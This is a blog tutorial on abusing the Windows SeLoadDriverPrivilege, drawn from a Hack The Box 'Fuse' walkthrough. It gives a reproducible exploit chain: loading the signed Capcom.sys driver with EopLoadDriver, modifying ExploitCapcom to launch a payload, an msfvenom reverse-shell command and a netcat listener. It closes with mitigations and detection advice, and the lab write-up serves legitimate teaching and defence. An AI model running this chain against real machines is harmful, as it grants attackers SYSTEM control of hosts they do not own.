+++
title = "Understanding SeLoadDriverPrivilege Escalation: A Deep Dive"
draft = false
tags = ["Windows", "Active Directory", "SeLoadDriverPrivilege", "Capcom"]
keywords = ["Windows privilege escalation", "SeLoadDriverPrivilege exploitation", "Capcom.sys vulnerability", "Kernel-mode driver exploitation", "Windows security", "Driver loading attacks", "SYSTEM privilege escalation", "Windows kernel exploitation", "Driver block rules", "Windows privilege management"]
description = "A comprehensive guide to understanding and exploiting SeLoadDriverPrivilege in Windows systems, covering the mechanics of driver loading attacks, Capcom.sys vulnerability exploitation, and privilege escalation techniques. Learn about kernel-mode driver exploitation and how to prevent these attacks in your environment."
author = "bloodstiller"
date = 2024-10-20
toc = true
bold = true
next = true
+++

## Introduction: {#introduction}

Among the various techniques employed by attackers, one particularly insidious method involves the exploitation of `SeLoadDriverPrivilege`. This Windows privilege, often overlooked, can serve as a powerful tool in the hands of malicious actors, enabling them to **elevate their permissions** and potentially **gain complete control over a system**.

**Key Points**:

-   `SeLoadDriverPrivilege` is a Windows privilege that can be exploited for privilege escalation
-   It's often overlooked but can grant attackers significant control over a system
-   Understanding this vulnerability is crucial for system administrators and security professionals

Let's dive into the world of `SeLoadDriverPrivilege` and explore how this seemingly innocuous privilege can become a significant security risk.


### Understanding `SeLoadDriverPrivilege`: {#understanding-seloaddriverprivilege}

At its core, `SeLoadDriverPrivilege` grants the ability to **load kernel-mode drivers** into the Windows operating system. While this might sound benign, it's a capability that normally requires administrative permissions, and for good reason. **Kernel-mode drivers operate at the highest level of the system**, with unrestricted access to system resources. This level of access is precisely what makes `SeLoadDriverPrivilege` so attractive to attackers.

Typically, this privilege is assigned to administrative groups or specific users like `Print Operators`. It's represented in the Windows API by the constant `SE_LOAD_DRIVER_NAME`. However, what makes it particularly dangerous is that it can sometimes be found enabled on accounts that aren't full administrators, creating a potential security gap.

**Key Points**:

-   `SeLoadDriverPrivilege` allows loading of kernel-mode drivers
-   Kernel-mode drivers have unrestricted access to system resources
-   This privilege is usually assigned to administrative groups but can sometimes be found on non-admin accounts
-   It's represented by `SE_LOAD_DRIVER_NAME` in the Windows API


## The Exploitation Process: {#the-exploitation-process}


### Overview &amp; Diagram: {#overview-and-diagram}

To better understand the flow of a `SeLoadDriverPrivilege` exploit, let's look at a simplified diagram of the process:

```shell
+--------------------------------------------------+
|                                                  |
|  +--------------------------------------------+  |
|  |                                            |  |
|  |  1. Enable SeLoadDriverPrivilege           |  |
|  |     - OpenProcessToken()                   |  |
|  |     - LookupPrivilegeValue()               |  |
|  |     - AdjustTokenPrivileges()              |  |
|  |                                            |  |
|  +--------------------------------------------+  |
|                       |                          |
|                       v                          |
|  +--------------------------------------------+  |
|  |                                            |  |
|  |  2. Interact with Windows Registry         |  |
|  |     - Access HKLM\SYSTEM\CurrentControlSet |  |
|  |       \Services                            |  |
|  |                                            |  |
|  +--------------------------------------------+  |
|                       |                          |
|                       v                          |
|  +--------------------------------------------+  |
|  |                                            |  |
|  |  3. Load Vulnerable Driver                 |  |
|  |     - Register driver in registry          |  |
|  |     - Use NtLoadDriver() to load driver    |  |
|  |                                            |  |
|  +--------------------------------------------+  |
|                       |                          |
|                       v                          |
|  +--------------------------------------------+  |
|  |                                            |  |
|  |  4. Exploit Vulnerable Driver              |  |
|  |     - Execute arbitrary code in kernel     |  |
|  |       space                                |  |
|  |     - Gain SYSTEM privileges               |  |
|  |                                            |  |
|  +--------------------------------------------+  |
|                                                  |
+--------------------------------------------------+
```

This diagram outlines the four main steps an attacker would typically follow when exploiting `SeLoadDriverPrivilege`. Let's dive deeper into each step.

-   You can see an example of this attack on my walkthrough for Fuse:
    -   <https://bloodstiller.com/walkthroughs/fuse-box/>


### Step 1: Enabling the SeLoadDriverPrivilege Privilege: {#step-1-enabling-the-seloaddriverprivilege-privilege}

The first step involves activating the `SeLoadDriverPrivilege`. Windows uses a token-based system for managing user privileges, and `SeLoadDriverPrivilege` is usually disabled by default, even if it's assigned to a user. Attackers can use Windows API functions like `LookupPrivilegeValue()` and `AdjustTokenPrivileges()` to enable this privilege on their token.


### Step 2: Registry Interaction: {#step-2-registry-interaction}

-   Once activated, `SeLoadDriverPrivilege` allows interaction with a critical area of the Windows Registry: `HKLM\SYSTEM\CurrentControlSet\Services`.
-   This registry key is crucial for driver loading, and access to it is a key part of the exploitation process.


### Step 3: Loading a Vulnerable Driver: {#step-3-loading-a-vulnerable-driver}

With the privilege activated and registry access established, the attacker can now load a driver of their choosing.

-   This is typically done by registering a malicious or vulnerable driver via the Windows registry and then using the `NtLoadDriver()` function to load it into kernel mode.


### Step 4: Exploiting the Driver: {#step-4-exploiting-the-driver}

The final step involves exploiting the loaded driver. Attackers often choose to load known vulnerable drivers, such as the infamous `Capcom.sys`. (which is a Windows signed driver) These vulnerable drivers can be exploited to execute arbitrary code in kernel space, effectively giving the attacker complete control over the system.


## Capcom.sys Driver Vulnerability: Arbitrary Code Execution with SYSTEM Privileges {#capcom-dot-sys-driver-vulnerability-arbitrary-code-execution-with-system-privileges}

Now that we've confirmed we have the necessary privilege and the system is vulnerable, let's look at the specific vulnerability we'll be exploiting.

-   **TL;DR**: Key Takeaways
-   `Capcom.sys` is a vulnerable driver that allows attackers to execute arbitrary code with `SYSTEM` privileges.
-   Protections like `VBS` and `HVCI` can help mitigate risks, but require modern hardware.
-   `Driver block rules`: can provide an additional layer of defense by preventing vulnerable drivers from loading.


### Overview of the Capcom.sys Vulnerability: {#overview-of-the-capcom-dot-sys-vulnerability}

-   The `Capcom.sys` kernel driver is notorious for its functionality that permits the execution of arbitrary code in kernel mode directly from user space.
-   Specifically, this driver disables `SMEP` (Supervisor Mode Execution Prevention) before invoking a function provided by the attacker, enabling us to run code with `SYSTEM` privileges.
    -   You can find the real `Capcom.sys` driver on GitHub: [Capcom.sys driver on GitHub](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

-   **Affected Windows Versions**:
    -   This exploit has been tested and verified on the following Windows versions:
    -   Windows 7 (x64)
    -   Windows 8.1 (x64)
    -   Windows 10 (x64) up to build `17134` (Version 1708)
    -   Windows 11 (x64) up to build `22000.194` (Version 21H2)
        -   Builds after `22000.194` contain deny lists that prevent this driver from loading.

-   **Security Considerations**:
    -   Modern versions of Windows have introduced protections like `Virtualization-based Security (VBS)` and `Hypervisor-Protected Code Integrity (HVCI)` to mitigate the risks posed by vulnerable drivers such as `Capcom.sys`.
    -   These security mechanisms enforce code integrity in the kernel, allowing only signed code to execute and blocking known vulnerable or malicious drivers. However, it's important to note that these features often require newer hardware and can have a performance impact.

    -   For a deeper dive into the issue of signed vulnerable drivers, you can refer to:
        -   [WeLiveSecurity's article](https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/)

-   **Mitigation Strategies**:
    -   To safeguard against vulnerabilities like this, Microsoft recommends implementing `driver block rules` as part of a comprehensive security policy.
    -   These block rules prevent the loading of known vulnerable or malicious drivers. Additionally, custom enterprise code integrity policies can be used to monitor and enforce these rules, with audit logs generated whenever a blocked driver attempts to load.

-   For more on how to implement and enforce these rules, check out:
    -   [Red Canary's guide on driver block rules](https://redcanary.com/blog/ms-driver-block-rules/)


## Real-World Exploitation Example {#real-world-exploitation-example}

To better understand how `SeLoadDriverPrivilege` exploitation works in practice, let's walk through a real-world example. This demonstration will show each step of the process, from identifying the vulnerability to achieving system-level access.


### Prerequisites: {#prerequisites}

Before we begin, ensure you have the following tools and environment set up:

-   A Windows virtual machine for compiling the necessary tools:
    -   I recommend using <https://github.com/mandiant/commando-vm>
-   Visual Studio for C++ compilation
-   Msfvenom for payload generation
-   A target Windows machine with `SeLoadDriverPrivilege` enabled for a non-admin user
    -   This can be the Fuse machine on HTB or on an internal lab of your own.

-   This is taken from my walkthrough of the HTB box fuse:
    -   <https://bloodstiller.com/walkthroughs/fuse-box/>


### Finding out we have the SeLoadDriverPrivilege privilege: {#finding-out-we-have-the-seloaddriverprivilege-privilege}

The first step in any privilege escalation attempt is to enumerate the current user's privileges. In this case, we're looking specifically for the `SeLoadDriverPrivilege`.

-   **I enumerate the privileges of my user**:
    -   `whoami /priv`
    -   {{< figure src="/ox-hugo/2024-10-17-144928_.png" >}}
    -   Checking my group memberships confirms this also:
    -   {{< figure src="/ox-hugo/2024-10-17-151209_.png" >}}


### Checking the system is vulnerable to the exploit: {#checking-the-system-is-vulnerable-to-the-exploit}

Not all systems are vulnerable to this exploit, even if the `SeLoadDriverPrivilege` is present. We need to check the Windows build number to ensure it's below a certain threshold.

-   **I check the build**:
    -   `[System.Environment]::OSVersion.Version`
    -   {{< figure src="/ox-hugo/2024-10-18-173023_.png" >}}
    -   It's `14393` so we can move forward with this attack.


### Executing the Attack {#executing-the-attack}

Now that we understand the vulnerability and have confirmed our system is susceptible, let's walk through the actual attack process.

-   I will include all steps as a means for you to be able to reproduce this with the box Fuse.


#### Download A Copy of the official Capcom.sys Signed Driver: {#download-a-copy-of-the-official-capcom-dot-sys-signed-driver}

-   **Download the official driver**:
    -   `wget https://github.com/FuzzySecurity/Capcom-Rootkit/raw/refs/heads/master/Driver/Capcom.sys`
        -   We will keep it locally at the moment as there are some other tools we need to compile before we can move forward.


#### Compiling the EopLoadDriver tool to enable us to load the Capcom.sys driver: {#compiling-the-eoploaddriver-tool-to-enable-us-to-load-the-capcom-dot-sys-driver}

The `EopLoadDriver` tool is a utility designed to leverage the `SeLoadDriverPrivilege` for loading a driver into the Windows kernel. It interacts with the Windows registry to register the driver and then uses the NtLoadDriver system call to load it. This tool is essential in our exploit chain as it allows us to load the vulnerable `Capcom.sys` driver, which we'll subsequently exploit to gain SYSTEM privileges. By using `EopLoadDriver`, we're able to bridge the gap between having the `SeLoadDriverPrivilege` and actually loading a driver of our choice into the kernel.

<!--list-separator-->

-  Preparing the `EopLoadDriver` C++ Project:

    -   **This is a** `C++` **file that will need to be compiled within** `Visual Studio`:
        -   I download the project:
            -   <https://github.com/TarlogicSecurity/EoPLoadDriver/>
        -   I create a new project:
            -   {{< figure src="/ox-hugo/2024-10-18-071257_.png" >}}
            -   Then type `Console` into the search bar &amp; select `ConsolApp` with `C++` written below it.
            -   Click `Next`

    -   **Give it a name &amp; also select**: `Place solution and project in the same directory`:
        -   {{< figure src="/ox-hugo/2024-10-18-071638_.png" >}}
        -   **Hit** `"Create"`

    -   **This provides a standard** `Hello World` **template, which can be used as the basis for the project**:
        -   {{< figure src="/ox-hugo/2024-10-18-072018_.png" >}}

<!--list-separator-->

-  Importing the `EopLoadDriver` code &amp; Compiling:

    -   **Delete all the code on the** `Hello World` **generated file &amp; paste in the contents of** [Targlogic's](https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/) `EopLoadDriver` **code**:
        -   <https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp>

    <!--listend-->

    -   **Modify the imports by removing `stdafx.h` so they look like this now**:
        -   {{< figure src="/ox-hugo/2024-10-18-181622_.png" >}}

    -   **Run the build and it should build successfully**:
        -   {{< figure src="/ox-hugo/2024-10-18-072752_.png" >}}


#### Compiling the ExploitCapcom exploit C++ project {#compiling-the-exploitcapcom-exploit-c-plus-plus-project}

The `ExploitCapcom` tool is the core component of our privilege escalation attack. It's designed to exploit the vulnerability in the `Capcom.sys` driver that we've loaded using `EopLoadDriver`. This tool takes advantage of the driver's ability to disable Supervisor Mode Execution Prevention (SMEP) and execute arbitrary code in kernel mode. By default, ExploitCapcom opens a new command prompt with `SYSTEM privileges`, but we'll modify it to launch our custom payload instead. This tool effectively completes the privilege escalation chain, leveraging the loaded vulnerable driver to elevate our permissions to the highest level in the Windows operating system.

<!--list-separator-->

-  Importing the `ExploitCapcom C++` Project:

    -   **This time clone the repo**:
        -   {{< figure src="/ox-hugo/2024-10-18-111819_.png" >}}

    -   **Paste in the repo url**:
        -   <https://github.com/tandasat/ExploitCapcom.git>
        -   {{< figure src="/ox-hugo/2024-10-18-111850_.png" >}}


#### Modifying ExploitCapcom exploit to enable a reverse shell {#modifying-exploitcapcom-exploit-to-enable-a-reverse-shell}

To make our exploit more useful, we'll modify it to give us a reverse shell instead of just opening a new command prompt.

-   **Open** `ExploitCapcom.cpp` **and do not remove the** `stdafx.h` **import**:
    -   The reason being is the actual required file containing the header is in this project. So you can compile with it.
        -   {{< figure src="/ox-hugo/2024-10-18-125040_.png" >}}

-   **This exploit by default opens a new elevated shell, however this requires we have** `GUI` **access. So modify to run a reverse shell**:
    -   Below is the code we are going to modify:
        -   `TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");`
    -   Modify it to run a reverse shell generated via `msfvenom`:

        -   Remember if you are not using the Fuse walkthrough to modify the path to one you have access to.

        <!--listend-->

        ```C++
          // Launches a command shell process
          static bool LaunchShell()
          {
              //Original Line Commented Out:
              //TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
              TCHAR CommandLine[] = TEXT("C:\\Users\\svc-print\\Documents\\shell.exe");
              PROCESS_INFORMATION ProcessInfo;
              STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
              if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
                  CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
                  &ProcessInfo))
              {
                  return false;
              }

              CloseHandle(ProcessInfo.hThread);
              CloseHandle(ProcessInfo.hProcess);
              return true;
          }
        ```

-   **Compile it**:
    -   {{< figure src="/ox-hugo/2024-10-18-125121_.png" >}}


#### Generating our reverse-shell payload using msfvenom: {#generating-our-reverse-shell-payload-using-msfvenom}

-   **Generate a simple reverse shell using** `msfvenom`:
    -   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[AttackIP] LPORT=[AttackPort] -f exe -o shell.exe`
    -   {{< figure src="/ox-hugo/2024-10-18-143546_.png" >}}


#### Run the exploit chain on the victim: {#run-the-exploit-chain-on-the-victim}

Now that we have all our tools ready, let's execute the attack:

1.  **I Use** `evil-winrm` **to transfer all the files to the target**:
    -   `upload [filename]`
    -   {{< figure src="/ox-hugo/2024-10-18-130359_.png" >}}
    -   Use whatever method you prefer

2.  **Load the driver Run Exploit**:
    -   `.\EopLoadDriver.exe System\CurrentControlSet\Capcom C:\Users\svc-print\Documents\Capcom.sys`
    -   {{< figure src="/ox-hugo/2024-10-18-130552_.png" >}}
    -   All 0's is good as a response, means we are working.

3.  **Setup Listener**:
    -   `rlwrap -cAr nc -lnvp 443`

4.  **Trigger exploit**:
    -   `.\ExploitCapcom.exe`
    -   {{< figure src="/ox-hugo/2024-10-18-143703_.png" >}}

5.  **Catch the reverse shell and verify privileges**:
    -   {{< figure src="/ox-hugo/2024-10-18-143802_.png" >}}


### Summary: {#summary}

This real-world example demonstrates the entire process of exploiting the `SeLoadDriverPrivilege`, from initial enumeration to achieving `SYSTEM`-level access.


## Defending Against SeLoadDriverPrivilege Attacks: {#defending-against-seloaddriverprivilege-attacks}

Given the potential for abuse, it's crucial for system administrators to take steps to mitigate the risks associated with `SeLoadDriverPrivilege`. This includes:

1.  Restricting privilege assignment to only the most trusted accounts.
2.  Implementing rigorous driver integrity checks.
3.  Regularly auditing account privileges to detect any unauthorized changes.
4.  Using driver blocklists to prevent known vulnerable drivers from being loaded.
5.  Employing application control solutions like Windows Defender Application Control (WDAC) or AppLocker to restrict driver loading.

Detection is equally important. Monitoring Windows Event Logs for driver loading events (Event ID 6), configuring `Sysmon` to track driver loads, and implementing behavioral analysis to spot unusual patterns of driver loading can all help in identifying potential attacks.

It's important to note that no single measure can provide complete protection against SeLoadDriverPrivilege exploitation. A defense-in-depth strategy, combining multiple layers of security controls, is crucial for comprehensive protection against this and other potential vulnerabilities.


## Conclusion: {#conclusion}

`SeLoadDriverPrivilege` serves as a stark reminder of the complexities involved in securing modern operating systems. What appears to be a benign administrative privilege can, in the wrong hands, become a powerful tool for system compromise. Mitigating such vulnerabilities will remain crucial in our ongoing efforts to protect our systems and data.


## Further Reading: {#further-reading}

**For those interested in diving deeper into this topic, I recommend exploring**:

-   [Microsoft documentation on User Rights Assignment](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/user-rights-assignment)
-   [Windows Internals, Part 1 by Pavel Yosifovich](https://www.amazon.co.uk/dp/0735684189?psc=1&smid=A3P5ROKL5A1OLE&ref_=chk_typ_imgToDp)
-   [MITRE ATT&amp;CK framework](https://attack.mitre.org/), particularly the entry on [T1543.003](https://attack.mitre.org/techniques/T1543/003/) - Create or Modify System Process (Windows Service).


## Frequently Asked Questions: {#frequently-asked-questions}


- **Q: Is `SeLoadDriverPrivilege` a vulnerability in Windows?**

    - A: `SeLoadDriverPrivilege` itself is not a vulnerability, but rather a legitimate Windows privilege that can be misused. The vulnerability lies in improper assignment or management of this privilege.


- **Q: Can `SeLoadDriverPrivilege` be completely disabled?**
  - A: While it's not recommended to completely disable this privilege as it's used by legitimate Windows processes, it's crucial to strictly limit which accounts have this privilege assigned.


- **Q: How can I check if my account has `SeLoadDriverPrivilege`?**

    - A: You can use the Windows "Local Security Policy" editor (`secpol.msc`) and navigate to "Security Settings" &gt; "Local Policies" &gt; "User Rights Assignment" to see which accounts have this privilege assigned.


- **Q: Are there any legitimate uses for `SeLoadDriverPrivilege`?** 

    - A: Yes, this privilege is used by system processes and certain applications that need to load drivers. For example, some antivirus software and system management tools require this privilege.


- **Q: How difficult is it to exploit `SeLoadDriverPrivilege`?** 

    - A: While the basic concept is straightforward, successfully exploiting this privilege requires a good understanding of Windows internals and kernel-mode programming. However, ready-made exploit tools do exist, lowering the barrier for less skilled attackers.


## Appendix: {#appendix}

-   **Sources used**:
    -   <https://attack.mitre.org/techniques/T1543/003/>
    -   <https://www.amazon.co.uk/dp/0735684189?psc=1&smid=A3P5ROKL5A1OLE&ref_=chk_typ_imgToDp>
    -   <https://github.com/TarlogicSecurity/EoPLoadDriver/>
    -   <https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/>
    -   <https://redcanary.com/blog/threat-detection/ms-driver-block-rules/>
    -   <https://www.welivesecurity.com/2022/01/11/signed-kernel-drivers-unguarded-gateway-windows-core/>
    -   <https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt>
